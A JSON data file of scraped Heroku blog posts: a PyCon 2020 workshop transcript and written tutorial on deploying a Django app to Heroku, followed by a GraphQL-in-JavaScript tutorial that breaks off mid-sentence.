[
{"website": "Heroku", "title": "From Project to Productionized with Python", "author": ["Ed Morley", "Casey"], "link": "https://blog.heroku.com/from-project-to-productionized-python", "abstract": "From Project to Productionized with Python Posted by Ed Morley and Casey June 22, 2020 Listen to this article We hope that you and your loved ones are staying safe from the COVID-19 pandemic. As a result of its effect on large gatherings, PyCon 2020 was cancelled changed to an online event . Although not being able to gather in person was disheartening for organizers, speakers, and attendees, the Python community shared virtual high-fives and hugs with PyCon US 2020 Online. We recorded our planned Heroku workshop for the event , on which this blog post is based. Casey Faist:\nHi, I'm Casey Faist the queen Pythonista at Heroku and this is From Project to Productionized on Heroku. Now, I wish we could be together today. I wish we could be swapping stories and coding together. I wish we could hear the groans from my deployable jokes. Now this is intended to be a hands-on workshop, so while video format presents some challenges for that, the good thing is that if at any point you need me to slow down or you want to go off on a rabbit hole, just pause the video. I'll be waiting for you right here. Now, this is intended as a hands-on workshop, so if you're going to follow along at home, first of all, high five, yeah. Second of all, we assume a couple things about your experience and there are a couple of prerequisites necessary for a good experience with this workshop. The first thing is that this is not a Django tutorial. Casey Faist:\nIf you're looking for intro to Django information, go to the official Django docs where they have some excellent tutorial information. Next, we assume a little bit of Git familiarity, you need Git installed on your machine that you're working on. We provide a starter repo for you to work along with that has instructions but it's available on GitHub, so you'll need to be able to Git clone that repo. To complete this workshop, you'll need four things. You will need to sign up for a Heroku account. This is free, you don't need to add a credit card. You will need to download the Heroku CLI. You will need to clone the workshop repo or use a project of your own, and you will need to be able to open that repo in a text editor or IDE of your choice. All right, have all that ready to go? Awesome. Let's get to it. Casey Faist:\nSo let me set the scene. You have an application, you've poured your blood, sweat and tears into this application. It's wonderful and it's finally ready. It's ready to go out there and be on the Internet. How do you do that? Luckily with Heroku, you've already done the hard part. See, Heroku is a platform-as a-service and unlike infrastructure-as-a-service models, there's a bunch of stuff that you just don't have to do. Stuff like infrastructure maintenance or building deploy pipelines, setting up tools to manage user access or system level security updates. You don't have to do it. It's not your problem. That is what Heroku is there to do. We're managing those security updates, providing tooling, all of those, plus metrics and more to make your life as a developer easier. It's a huge time save but there's a catch. A 12 factored catch. Speaker 2:\nBoo. Casey Faist:\nSee Heroku works best with 12 factor applications. This is something that Heroku championed more than 10 years ago. It's the idea that you build an application with robust redeploys in mind. Things like config variables, using processes and more. If you'd like to learn more, you can check out the link here. But most of this workshop is actually not specific to Heroku. A lot of what we're going to do today is about taking a Django application and making it 12 factored. There's a lot of benefits to using 12 factor applications whether or not you're deploying to Heroku but it's especially important on Heroku because of something called ephemeral deploys. Ephemeral deploys or ephemeral environments are designed to spin up or down at a moment's notice with very little downtime but this means that you can't persist anything to the local file system. Casey Faist:\nIt either needs to be checked into Git, stored in a database or as an environment variable or in an attached resource like an S3 bucket that does persist. Now if you've never worked with 12 factor applications before, don't worry. We're going to do 10 steps together to take your application From Project to Productionized on Heroku. Once you've opened the project in the text editor of your choice, take a second to look around. Your editor and your terminal should be in the root directory of the Pycon 2020 project. So I type ls, you should see manage.py, requirements.txt, and workshop.md. You'll also see two Django projects. The first is hello, we won't do anything to this one, so don't worry about it but the other one is called getting started. We'll make a couple of changes to this one including updates to settings.py and the WSGI file. But for now, bring up the workshop.md file. Our first step is to update the gitignore file, copy the text here in the code block, then navigate to the gitignore file in the root of your project. Highlight and copy and paste. Casey Faist:\nIf you're working off of the raw markdown file, you want to make sure you don't transfer any quotes or back ticks as they'll mess with how this file works. I created a virtual env already, up here it's called venv, so I don't need to add this line, I can remove it. I don't want any pycache files stored. I also don't want to add any SQLite databases or sequel SQLite artifacts to source control. Any local data that I'm using for testing or to ensure my application works that should stay locally on my machine and not get pushed to Git. However important note, you absolutely do want to add your Django migrations to source control, so make sure that you do not add any of your Django migrations to this gitignore file. Okay. And now the last step, this app is not called your app, it's called, we're actually looking for getting started here. This is where our static files will generate. Heroku will automatically generate our static files for us, but we don't want to check our local ones into Git, we want Heroku to rebuild those on deploy. Casey Faist:\nThis looks good. So I am going to save the file. Then I'm going to come down to my terminal and I'm going to check this change into Git, so I can check the status real quick just by the git status command. Cool, I only have the one change I'm going to git add the gitignore file and then I'm going gitcommit -m for message. Step one add gitignore. Now to deploy to Heroku do we need a gitignore file? Technically no. You can deploy successfully without a gitignore file present but it's highly recommended and not just for Heroku. Never store passwords or credentials in a Git repo. Don't push them up, don't put them in to begin with. You want to keep those things private and safe. Adding those files to your gitignore is a great way to do that. Casey Faist:\nSimilarly, anything you don't want pushed up to Heroku is a great candidate for the gitignore file. Things like your local venv, which you don't want to deploy it to Heroku because Heroku sets you up and environment for Python automatically. Other things like files you don't want included or general cruft to keep your deploy clean goes in your gitignore file. Next up we want to modularize our Django settings. To do that we need to navigate to our getting started Django directory, it's right here and now that we're here we're going to add a new folder. You're going to call this folder settings and this does matter, so make sure that you do use the name settings and now we're going to grab our settings.py file and we're going to move it to our directory. Now, this naming will get confusing, so I'm going to rename this to base.py. I chose this name because this is going to serve as the base that all of our other settings configurations are going to pull from but if something like dev or local.py makes more sense to you, feel free to use that. Casey Faist:\nJust change out base for what you name this file later on. By moving and renaming the settings file our Django application now has two broken references, let's fix them before we move on. The first is in the wsgi.py in your getting started folder. Open it up and on line 12 you'll see that it has a Django settings module default being set and what we're setting it to is gettingstarted.settings. This is what it used to be, but we just moved our settings file, so to fix this, all we have to do is add a dot and then since I named my file base, I'm just going to type out base. Perfect. Save that and then navigate one more directory up to the root level directory, find manage.py. On line six you'll see here the same default is being set for the Django settings module. Same thing here, we want to add .base to the end of this line. Then as always, save these changes and add them to Git. Casey Faist:\nLocal projects only have one environment to keep track of, your local machine but once you want to deploy to different places or stages, its important to keep track of what settings go where. Nesting our settings files this way it makes it easy for us to keep track of where those settings are as well as take advantage of Heroku's continuous delivery tool pipelines. So you have four stages you build in development stage. This is your local machine, Docker container, however you like to develop locally. Next in the review stage, you want to check if your test pass along with the full test suite of your code base. If that goes well, you merge to staging, which is where you probably have more realistic settings, maybe some test data available in order to more accurately predict how the change will impact your production settings. Lastly, if all that goes well, you push to production where the change is now live for your customers. Casey Faist:\nContinuous delivery or CD workflows are designed to test your change in conditions progressively closer and closer to production and in more and more detail. If something breaks, this means it's easier to debug since you know exactly what settings it broke with and when you deploy, you can deploy it with confidence knowing that you've tested your change thoroughly and in conditions as close to your production settings as possible. Continuous delivery is a powerful workflow and can make all of the difference in your experience as a developer once you've productionized your application. Heroku can save you a lot of time here, we've already built the tools for you to have a continuous delivery workflow. From your dashboard on Heroku you can with the click of a button, set up a pipeline, add applications to staging and production as well as deploy. You can also, if needed, roll back. Casey Faist:\nIf you connect your GitHub repository, pipelines can also automatically deploy and test new PRs opened on your repo. By providing the tooling and automating these processes, Heroku's continuous delivery workflow is powerful enough to help you keep up with your development cycle. Modularizing your Django settings is a great way to take advantage of this continuous delivery workflow by splitting up your settings, whether you're deploying to Heroku or elsewhere but there's one more thing we have to do to base.py. Django static assets work best when you also use whitenoise to manage your static assets. It's really easy to add to your project. Start by copying this middleware line here, all of it, this time you want the quotes and the comma. Copy and now head back to base.py. Casey Faist:\nWe're looking for your middleware list, Django loads your middleware in the order that it's listed here, so you always want your security first but it's important to add whitenoise as the second step in this base file. In this project I have a handy reminder where it goes. Boop. Next, jump back to the workshop and grab this next code block, the static file storage setting. Copy it and in base.py we're going to scroll all the way down to the bottom. See we've loaded whitenoise as middleware but to actually use whitenoise compression, we need to set this variable and with that we're done with base.py, congratulations. Save your work and commit it to Git. Our base settings are complete but now we need our Heroku settings. If you come to the workshop.md, you can see I've already provided a template file that should work with most projects. You can see here at the top we are importing our base settings file. If you're using your own project, make sure that you update this line to match what your directory structure looks like. For now, grab this whole text block and copy it. Casey Faist:\nNavigate to base.py and instead of changing that file, we're going to add a new file to the settings folder. I'm going to call it heroku.py and inside this file we're going to paste our template. You can see in this file the values that we're listing are the ones that we're overriding from our base settings, so these are the settings that will be different on Heroku. Now we're using one of my favorite packages to do this. It's Django-environ imported just as environ. This allows us to quickly and easily interface with the operating system environment without knowing much about it. It's got built-in type conversions such as this, it knows and will cast this environment variable to a list for us and in particular it's automatic database parsing. This is all we need in order to parse our Heroku Postgres database URL that we will be given. It's just really convenient, so I'm a big fan of this package. I recommend you check it out. But with that, save and our settings are complete. Casey Faist:\nAwesome. That's all the work we need to do to get our application into 12 factored shape but there's three more files we need in order to deploy to Heroku. Requirements.txt is a standard Python dependency file. In addition to the packages your project already uses, there's a few you need to deploy to Heroku. If we take a look at the provided requirements.txt file, you can see these required packages here. Obviously we have Django but there are four other ones. We've already talked about Django-environ as well as whitenoise and we've already configured those but the other two are also important and needed for deploy. The first is Gunicorn or Gunacorn. This is the recommended WSGI server for Heroku. We'll take a look at configuring this in just a bit. The last one is psychopg2. This is a Postgres database adapter. You need it in your requirements.txt file to deploy but you don't need any code changes in order to activate it, we just need it installed in the environment. Casey Faist:\nA quick note, I chose to keep things simple for the purpose of this demo but when you're ready to deploy your project to Heroku, consider freezing your dependencies. You can do this with pip freeze. This will make your build a little bit more predictable by locking your exact dependency versions into your Git repo. This is important because Heroku recycles your resources once a day. This is important for application health but if your dependencies aren't locked, you might find yourself deploying one version of Django one day and a new one the next. When Heroku cycles your application resources which are organized into containers called dynos, we're not just reinstalling your application. On every dyno cycle or dyno deploy, Heroku rebuilds your environment onto AWS resources, this doesn't just mean your Django app. This means all of the system packages that Heroku provides as well as your Python installation. Casey Faist:\nHeroku will install a default Python version if you don't specify one, but if you want to pick your Python version, you'll need a runtime.txt file. You want to put it in the root level directory next your requirements, manage.py, gitignore and the rest. This file only needs one line formatted like this, a lowercase python, a dash, and then the major, minor and patch version that you want your application to run on. The last file we need to add is a file specific to Heroku. The Procfile. This is what we use to specify the processes our application should run. The processes specified in this file will automatically boot on deploy to Heroku. The Procfile also goes in the root level directory right next to your requirements and runtime file. Make sure to capitalize the P of Procfile otherwise Heroku might not recognize it. Casey Faist:\nNow the first thing we're going to do is specify a release phase process. The release phase of deploy is the best place to run tasks like migrations or updates and that's what we're going to add here. So pythonmanage.py migrate. The other process we're going to add to this file is the web process, the most important process for any web application. The other process we're going to add today is a web process. This is a very important process for web application. This is where our Gunicorn config goes. You want to pass Gunicorn the same things you would if you were to run it locally. So we want to pass it our WSGI file, which is located in the getting started directory and then we're going to give it a bit of configuration. So we're going to pass it preload, this will ensure it can receive requests just a little bit faster and then we're going to specify that the log file should get routed to Heroku. Casey Faist:\nCongratulations, you've updated your app and you are ready for deploy. Woo hoo! Take a second before moving on and just double check that you've saved and committed all of your changes to Git. Remember, we need those changes in the Git repo in order for them to successfully deploy. After that, let's get ready to make an app. The first step is to create our Heroku app. You can do this from the command line since we already installed the Heroku CLI at the beginning of this workshop. All you need to do is type in Heroku create. All right, time to make some magic. It is Heroku create time. Enigmatic mountain. Excellent. This has done a couple of things for us. First, you can see it's generated not only an app but a unique name, that's that \"enigmatic mountain\" there. Next, it's provided a unique URL, this is where our app will live on the web and lastly, it's added a Git remote to our Git repository. Casey Faist:\nYou can confirm by saying git remote and now you can see that Heroku is there, that's how we're going to deploy. Now, before we go anywhere, I'm just going to grab this URL. I'm going to copy it because we'll need it in a second. Remember when we created our heroku.py settings file? We used Django-environ to load environment variables into our settings config. Those settings config need to be present in our Heroku environment, so let's set those now. We'll be using the Heroku CLI for this but you can add and edit config variables from your dashboard directly. The Heroku CLI command we'll be using though is heroku config:set. This will take in your key-value pairs as argument and set in your Heroku runtime environment. First, let's configure our allowed hosts, so we want to type in a heroku config:set and allowedhosts= and then we're going to paste that URL we just got. Make sure to remove the slash on the end if you haven't already. Perfect. Casey Faist:\nNext, let's set our Django settings module, so up arrow and Django settings module. This is what determines what settings configuration we use on this platform. So you will remember that we want to use the gettingstarted.settings and instead of base this time, we want the Heroku settings. Now we need to add the secret key as a config var to our application. We can use the same CLI command, heroku config:set to do this and make sure that you add a different secret key than you used locally. It can be anything. You may even want to check out the Python secrets module if you have specific secret key requirements. But the important thing is do not add your production secret key to Git ever and only share it with a password manager. Like Gandalf said, \"Keep it secret, keep it safe.\" Now locally, Django is configured to use a SQLite database but we're productionizing. We need something a little bit more powerful, so it's time to provision our Postgres database. Casey Faist:\nFirst, let's check if we have a database already. Heroku addons will tell us. Okay, so we do need one for our application. Makes sense, it's brand new. Now you can do this with the click of a button from your dashboard but I'm going to show you how to do it from your command line. heroku addon just like before and we're going to create a Heroku Postgres goal, Postgres sequel and we're going to use the hobby dev tier of database. We offer several tiers of Postgres database. This is the free tier, so you can play around with this without a credit card. Boom, Postgres database. And if you remember from the settings file, our application is expecting this database URL. Luckily, this command automatically adds this to our Heroku environment so we don't have to do anything more to connect our application to our Postgres database. It is time. Your code is ready, your Heroku app is configured, you are ready to deploy. This is the easy part. Speaker 2:\nYay. Casey Faist:\nFirst, make sure your terminal is in the root level directory of your project. If you type ls on Mac or Linux, you should see that requirements.txt file and the runtime.txt file right there. Then just type out, git push heroku master and we take care of the rest. You'll see your build logs scrolling through your terminal. This will show you what we're installing on your behalf and where you are in the build process. You'll see the release phase as well that we specified earlier. Now, if you're not on the master branch, you made your own, no worries. You can still deploy your code to Heroku but you'll need to type out, git push heroku, your branch:master. The last step is to scale up our web process. This creates new dynos, however many you specify or copies of your code into our containers to handle more web traffic. You can do this from your dashboard or you can use the Heroku ps:scale command and we want to scale up our web process to one. Casey Faist:\nNow to go freak out about your brand new website just type in heroku open and there you have it. Okay. If you hit some snags, don't worry, we have some tips that might help. Number one, are all of your changes saved and checked into Git? Number two, are your changes on master or are they on a different branch or a combination? Make sure that whatever you're deploying, all of your changes are in that Git branch. Number three, did you deploy from the root directory of your project? Did you also Heroku create from the root directory of your project? If not, this could absolutely cause a trip up. Number four, did you remove anything from the code in the provided demo that we didn't discuss? Number five, use your tools. What tools you ask? In addition to your build logs which will tell you whether your application successfully deployed or not, you have access to all logs produced by Heroku and by your application. You can get to them through a couple of ways but the quickest way is just to say, heroku logs tail. Casey Faist:\nAnd this, let me make this screen a little bit bigger, is the live feedback from your application. If you switch over and click on something that'll get reflected here. You can see that we have our Heroku web one process, we have our app processes and then we have these router methods. You can see this one's a GET. All of this is here to help you debug any connection issues you may have. Another tool you have is the Heroku run bash command. This spins up a one time or one-off dyno container that you have direct access to from your console. So if I ls, you can see that this is my deployed application, it can be useful to check that what is up here matches what is locally on your machine. If not, you might see some issues. You can also check whether things work by spinning up a Python terminal and this is a full Python REPL, so anything you could do locally you can do here. Casey Faist:\nHeroku has a wealth of technical documentation as well. Dev Center is where you'll find most of our technical how-to and supported technologies information and if you're having a technical issue, chances are someone else has asked the same question and been answered on our help docs. Use both of these resources to solve your problems as well as to learn about best practices when deploying to Heroku. And with that you have successfully productionized and deployed a Heroku app. Congratulations. I hope you had as much fun in this tutorial as I had putting it together. I have been Casey Faist, you have been amazing. Stay well and happy coding from your friends at Heroku. Imagine that you've just spent the last two weeks pouring all your energy into an application. It's magnificent, and you're finally ready to share it on the Internet. How do you do it? In this post, we're going to walk through the hands-on process aimed at Python developers deploying their local application to Heroku. An application running on Heroku works best as a 12-factor application . This is actually a concept that Heroku championed over 10 years ago. It's the idea that you build an application with robust redeployments in mind. Most of this workshop is actually not specific to Heroku, but rather, about taking a regular Django application and making it meet the 12 factor app methodology, which has become a standard that most cloud deployment providers not only support but recommend. Prerequisites Before completing this workshop, we're going to make a few assumptions about you, dear reader. First, this is not going to be a Django tutorial. If you're looking for an introduction to Django, their documentation has some excellent tutorials to follow . You will also need a little bit of Git familiarity, and have it installed on your machine. In order to complete this workshop, you'll need a few things: An account on Heroku . This is completely free and doesn't require any payment information. The Heroku CLI . Once your application is on Heroku, this will make managing it much easier. You'll need to clone the repository for this workship , and be able to open it in a text editor. With all that sorted, it's time to begin! Look around you With the project cloned and available on your computer, take a moment to explore its structure. We'll be modifying the manage.py and requirements.txt files, as well as settings.py and wsgi.py in the gettingstarted folder. Updating .gitignore To begin with, we'll be updating the gitignore file. A gitignore file excludes files which you don't want to check into your repository. In order to deploy to Heroku, you don't technically need a gitignore file. You can deploy successfully without one, but it's highly recommended to always have one (and not just for Heroku). A gitignore can be essential for keeping out passwords and credentials keys, large binary files, local configurations, or anything else that you don't want to expose to the public. Copy the following block of code and paste it into the gitignore file in the root of your project: /venv\n__pycache__\ndb.sqlite3          # not needed if you're using Postgres locally\ngettingstarted/static/ The venv directory contains a virtual environment with the packages necessary for your local Python version. Similarly, the __pycache__ directory contains precompiled modules unique to your system . We don't want to check in our database ( db.sqlite3 ), as we don't want to expose any local data. Last, the static files will be automatically generated for us during the build and deploy process to Heroku, so we'll exclude the gettingstarted/static/ directory. Go ahead and run git status on your terminal to make sure that gitignore is the only file that's been modified. After that, call git add , then git commit -m \"step 1 add git ignore\" . Modularize your settings Next up, we want to modularize our Django settings. To do that, add a new folder within gettingstarted called settings . Then, move the settings.py file into that directory. Since this naming scheme is a bit confusing, let's go ahead and rename that file to base.py . We'll call it that because it will serve as the base (or default) configuration that all the other configurations are going to pull from. If something like dev.py or local.py makes more sense to you, feel free to use that instead! Local projects only have one environment to keep track of: your local machine. But once you want to deploy to different places, it's important to keep track of what settings go where. Nesting our settings files this way makes it easy for us to keep track of where those settings are, as well as take advantage of Heroku's continuous delivery tool pipelines. By moving and renaming the settings file, our Django application now has two broken references. Let's fix them before we move on. The first is in the wsgi.py in your gettingstarted folder. Open it up, and on line 12 you'll see that a default Django settings module is being set to gettingstarted.settings , a file which no longer exists: os.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"gettingstarted.settings\") To fix this, append the name of the file you just created in the settings subfolder. For example, since we called ours base.py , the line should now look like this: os.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"gettingstarted.settings.base\") After saving that, navigate up one directory to manage.py . On line 6 , you'll see the same default being set for the Django settings module. Once again, append .base to the end of this line, then commit both of them to Git. Continuous delivery pipelines In an application's deployment lifecycle, there are typically four stages: You build your app in the development stage on your local machine to make sure it works. Next comes the review stage, where you check to see if your changes pass with the full test suite of your code base. If that goes well, you merge your changes to staging. This is where you have conditions as close to public as possible, perhaps with some dummy data available, in order to more accurately predict how the change will impact your users. Lastly, if all that goes well, you push to production, where the change is now live for your customers. Continuous delivery (CD) workflows are designed to test your change in conditions progressively closer and closer to production and with more and more detail. Continuous delivery is a powerful workflow that can make all of the difference in your experience as a developer once you've productionized your application. Heroku can save you a lot of time here, as we've already built the tools for you to have a continuous delivery workflow. From your dashboard on Heroku, you can—with the mere click of a button!– set up a pipeline , add applications to staging and production, and deploy them. If you connect your GitHub repository , pipelines can also automatically deploy and test new PRs opened on your repo. By providing the tooling and automating these processes, Heroku's continuous delivery workflow is powerful enough to help you keep up with your development cycle. Adding new middleware to base.py Modularizing your Django settings is a great way to take advantage of this continuous delivery workflow by splitting up your settings, whether you're deploying to Heroku or elsewhere, but there's one more change we have to make to base.py . Django static assets work best when you also use the whitenoise package to manage your static assets. It's really easy to add to your project. In your base.py file, scroll down to about line 43, and you should see an array of package names like this: MIDDLEWARE = [\n    \"django.middleware.security.SecurityMiddleware\",\n    # Whitenoise goes here\n    \"django.contrib.sessions.middleware.SessionMiddleware\",\n    \"django.middleware.common.CommonMiddleware\",\n    \"django.middleware.csrf.CsrfViewMiddleware\",\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\n    \"django.contrib.messages.middleware.MessageMiddleware\",\n    \"django.middleware.clickjacking.XFrameOptionsMiddleware\",\n] This is your list of Django middleware , which are sort of like plugins for your server. Django loads your middleware in the order that it's listed, so you always want your security middleware first, but it's important to add whitenoise as the second step in this base file. Copy the following line of code and replace the line that says Whitenoise goes here with this: \"whitenoise.middleware.WhiteNoiseMiddleware\", We've loaded whitenoise as middleware, but to actually use the whitenoise compression, we need to set one more variable. Copy the following code and paste it right at the end of your base.py file: STATICFILES_STORAGE = \"whitenoise.storage.CompressedManifestStaticFilesStorage\" With that, we're done with base.py . Congratulations! Save your work and commit it to Git. Setting up heroku.py Our base settings are complete, but now we need our Heroku-specific settings. Create a new file under gettingstarted/settings called heroku.py and paste the following block of code: \"\"\"\nProduction Settings for Heroku\n\"\"\"\n\nimport environ\n\n# If using in your own project, update the project namespace below\nfrom gettingstarted.settings.base import *\n\nenv = environ.Env(\n    # set casting, default value\n    DEBUG=(bool, False)\n)\n\n# False if not in os.environ\nDEBUG = env('DEBUG')\n\n# Raises django's ImproperlyConfigured exception if SECRET_KEY not in os.environ\nSECRET_KEY = env('SECRET_KEY')\n\nALLOWED_HOSTS = env.list('ALLOWED_HOSTS')\n\n# Parse database connection url strings like psql://user:pass@127.0.0.1:8458/db\nDATABASES = {\n    # read os.environ['DATABASE_URL'] and raises ImproperlyConfigured exception if not found\n    'default': env.db(),\n} You can see in this file the values that we're listing here are the ones that we're overriding from our base settings, so these are the settings that will be different and unique for Heroku. To do this, we're using one of my favorite packages, Django-environ . This allows us to quickly and easily interface with the operating system environment without knowing much about it. It has built-in type conversions, and in particular it has automatic database parsing. This is all we need in order to parse our Heroku Postgres database URL that we will be given. It's just really convenient. Heroku-specific files That's all the work we need to do to get our application into 12 factored shape, but there are three more files we need in order to deploy to Heroku. requirements.txt In addition to the packages your project already uses, there are a few more you need to deploy to Heroku. If we take a look at the provided requirements.txt file, you can see these required packages here. We've already talked about Django, Django-environ, and whitenoise, and we've already configured those for use. But the other two are also important and needed for deployment. The first one is called Gunicorn . This is the recommended WSGI server for Heroku. We'll take a look at configuring this in just a bit. The next one is psychopg2 . This is a Postgres database adapter. You need it in your requirements.txt file to deploy, but you don't need any code changes in order to activate it. A quick side note: we're keeping our discussion on packages simple for the purpose of this demo, but when you're ready to deploy a real project to Heroku, consider freezing your dependencies. You can do this with the pip freeze command. This will make your build a little bit more predictable by locking your exact dependency versions into your Git repo. If your dependencies aren't locked, you might find yourself deploying one version of Django one day and a new one the next. runtime.txt Heroku will install a default Python version if you don't specify one, but if you want to pick your Python version, you'll need a runtime.txt file. Create one in the root directory, next to your requirements.txt , manage.py , .gitignore and the rest. Specify your Python version with the prefix python- , followed by the major, minor, and patch version that you want your application to run on: python-3.8.2 Procfile The last file we need to add is a file specific to Heroku: the Procfile . This is what we use to specify the processes our application should run. The processes specified in this file will automatically boot on deploy to Heroku. Create a file named Procfile in the root level directory, right next to your requirements.txt and runtime.txt files. (Make sure to capitalize the P of Procfile otherwise Heroku might not recognize it!) Copy-paste the following lines into it: release: python3 manage.py migrate\nweb: gunicorn gettingstarted.wsgi --preload --log-file - The release phase of a Heroku deployment is the best place to run tasks, like migrations or updates. The command we will run during this phase is to simply run the migrate task defined in manage.py . The other process is the web process, which is very important, if not outright essential, for any web application. This is where we pass our Gunicorn config, the same things we need when running the server locally. We pass it our WSGI file, which is located in the gettingstarted directory, and then we pass a few more flags to add it a bit more configuration. The --preload flag ensures that the app can receive requests just a little bit faster; the --logfile just specifies that the log file should get routed to Heroku. Readying for deployment Take a second before moving on and just double check that you've saved and committed all of your changes to Git. Remember, we need those changes in the Git repo in order for them to successfully deploy. After that, let's get ready to make an app! Creating an app with heroku create Since we have the Heroku CLI installed, we can call heroku create on the command line to have an app generated for us: $ heroku create\nCreating app... done, ⬢ mystic-wind-83\nCreated http://mystic-wind-83.herokuapp.com/ | git@heroku.com:mystic-wind-83.git Your app will be assigned a random name—in this example, it's mystic-wind-83 —as well as a publicly accessible URL. Setting environment variables on Heroku When we created our heroku.py settings file, we used Django-environ to load environment variables into our settings config. Those environment variables also need to be present in our Heroku environment , so let's set those now. The Heroku CLI command we'll be using for this is heroku config:set . This will take in key-value pairs as arguments and set them in your Heroku runtime environment. First, let's configure our allowed hosts. Type the following line, and replace YOUR_UNIQUE_URL with the URL generated by heroku create : $ heroku config:set ALLOWED_HOSTS=<YOUR_UNIQUE_URL> Next, let's set our Django settings module. This is what determines what settings configuration we use on this platform. Instead of using the default of base , we want the Heroku-specific settings: $ heroku config:set DJANGO_SETTINGS_MODULE=gettingstarted.settings.heroku Lastly, we'll need to create a SECRET_KEY . For this demo, it doesn't matter what its value is. You can use a secure hash generator like md5 , or a password manager's generator. Just be sure to keep this value secure, don't reuse it, and NEVER check it into source code! You can set it using the same CLI command: $ heroku config:set SECRET_KEY=<gobbledygook> Provisioning our database Locally, Django is configured to use a SQLite database but we're productionizing. We need something a little bit more robust. Let's provision a Postgres database for production. First, let's check if we have a database already. The heroku addons command will tell us if one exists: $ heroku addons\nNo add-ons for app mystic-wind-83. No add-ons exist for our app, which makes sense—we just created it! To add a Postgres database, we can use the addons:create command like this: $ heroku addons:create heroku-postgresql:hobby-dev Heroku offers several tiers of Postgres databases. hobby-dev is the free tier, so you can play around with this without paying a dime. Going live It is time. Your code is ready, your Heroku app is configured, you are ready to deploy. This is the easy part! Just type out $ git push heroku master And we'll take care of the rest! You'll see your build logs scrolling through your terminal. This will show you what we're installing on your behalf and where you are in the build process. You'll also see the release phase as well that we specified earlier. Scaling up The last step is to scale up our web process. This creates new dynos, or, in other words, copies of your code on Heroku servers to handle more web traffic. You can do this using the following command: $ heroku ps:scale web=1 To see your app online, enter heroku open on the terminal. This should pop open a web browser with the site you just built. Debugging If you hit some snags, don't worry, we have some tips that might help: Are all of your changes saved and checked into Git? Are your changes on the master branch or are they on a different branch? Make sure that whatever you're deploying, all of your changes are in that Git branch. Did you deploy from the root directory of your project? Did you also call heroku create from the root directory of your project? If not, this could absolutely cause a trip up. Did you remove anything from the code in the provided demo that we didn't discuss? Logging If you've run through this list and still have issues, take a look at your log files. In addition to your build logs—which will tell you whether your application successfully deployed or not—you have access to all logs produced by Heroku and by your application. You can get to these through a couple of different ways, but the quickest way is just to run the following command: $ heroku logs --tail Remote console Another tool you have is the heroku run bash command. This provides you with direct access from your terminal to a Heroku dyno with your code deployed to it. If you type ls , you can see that this is your deployed application. It can be useful to check that what is up here matches what is locally on your machine. If not, you might see some issues. Wrapping up Congratulations on successfully deploying your productionized app onto Heroku! To help you learn about Heroku, we also have a wealth of technical documentation. Our Dev Center is where you'll find most of our technical how-to and supported technologies information. If you're having a technical issue, chances are someone else has asked the same question and it's been answered on our help docs. Use these resources to solve your problems as well as to learn about best practices when deploying to Heroku. pycon tutorial django python", "date": "2020-06-22,"},
{"website": "Heroku", "title": "Building a GraphQL API in JavaScript", "author": ["Owen Ou", "Chris Castle"], "link": "https://blog.heroku.com/building-graphql-api-javascript", "abstract": "Building a GraphQL API in JavaScript Posted by Owen Ou and Chris Castle June 24, 2020 Listen to this article Over the last few years, GraphQL has emerged as a very popular API specification that focuses on making data fetching easier for clients, whether the clients are a front-end or a third-party. In a traditional REST-based API approach, the client makes a request, and the server dictates the response: $ curl https://api.heroku.space/users/1\n\n{\n  \"id\": 1,\n  \"name\": \"Luke\",\n  \"email\": \"luke@heroku.space\",\n  \"addresses\": [\n    {\n    \"street\": \"1234 Rodeo Drive\",\n    \"city\": \"Los Angeles\",\n    \"country\": \"USA\"\n    }\n  ]\n} But, in GraphQL, the client determines precisely the data it wants from the server. For example, the client may want only the user's name and email, and none of the address information: $ curl -X POST https://api.heroku.space/graphql -d '\nquery {\n  user(id: 1) {\n    name\n    email\n  }\n}\n'\n\n{\n  \"data\":\n    {\n    \"name\": \"Luke\",\n    \"email\": \"luke@heroku.space\"\n    }\n} With this new paradigm, clients can make more efficient queries to a server by trimming down the response to meet their needs. For single-page apps (SPAs) or other front-end heavy client-side applications, this speeds up rendering time by reducing the payload size. However, as with any framework or language, GraphQL has its trade-offs. In this post, we'll take a look at some of the pros and cons of using GraphQL as a query language for APIs, as well as how to get started building an implementation. Why would you choose GraphQL? As with any technical decision, it's important to understand what advantages GraphQL offers to your project, rather than simply choosing it because it's a buzzword. Consider a SaaS application that uses an API to connect to a remote database; you'd like to render a user's profile page. You might need to make one API GET call to fetch information about the user, like their name or email. You might then need to make another API call to fetch information about the address, which is stored in a different table. As the application evolves, because of the way it's architected, you might need to continue to make more API calls to different locations. While each of these API calls can be done asynchronously, you must also handle their responses, whether there's an error, a network timeout, or even pausing the page render until all the data is received. As noted above, the payloads from these responses might be more than necessary to render your current pages. And each API call has network latency and the total latencies added up can be substantial. With GraphQL, instead of making several API calls, like GET /user/:id and GET /user/:id/addresses , you make one API call and submit your query to a single endpoint: query {\n  user(id: 1) {\n    name\n    email\n    addresses {\n    street\n    city\n    country\n    }\n  }\n} GraphQL, then, gives you just one endpoint to query for all the domain logic that you need. If your application grows, and you find yourself adding more data stores to your architecture—PostgreSQL might be a good place to store user information, while Redis might be good for other kinds—a single call to a GraphQL endpoint will resolve all of these disparate locations and respond to a client with the data they requested. If you're unsure of the needs of your application and how data will be stored in the future, GraphQL can prove useful here, too. To modify a query, you'd only need to add the name of the field you want: addresses {\n      street\n+     apartmentNumber   # new information\n      city\n      country\n    } This vastly simplifies the process of evolving your application over time. Defining a GraphQL schema There are GraphQL server implementations in a variety of programming languages, but before you get started, you'll need to identify the objects in your business domain, as with any API. Just as a REST API might use something like JSON schema , GraphQL defines its schema using SDL, or Schema Definition Language , an idempotent way to describe all the objects and fields available by your GraphQL API. The general format for an SDL entry looks like this: type $OBJECT_TYPE {\n  $FIELD_NAME($ARGUMENTS): $FIELD_TYPE\n} Let's build on our earlier example by defining what entries for the user and address might look like: type User {\n  name:     String\n  email:    String\n  addresses:   [Address]\n}\n\ntype Address {\n  street:   String\n  city:     String\n  country:  String\n} User defines two String fields called name and email . It also includes a field called addresses , which is an array of Address objects. Address also defines a few fields of its own. (By the way, there's more to a GraphQL schema than just objects, fields, and scalar types. You can also incorporate interfaces, unions, and arguments, to build more complex models, but we won’t cover those for this post.) There's one more type we need to define, which is the entry point to our GraphQL API. You'll remember that earlier, we said a GraphQL query looked like this: query {\n  user(id: 1) {\n    name\n    email\n  }\n} That query field belongs to a special reserved type called Query . This specifies the main entry point to fetching objects. (There’s also a Mutation type for modifying objects.) Here, we define a user field, which returns a User object, so our schema needs to 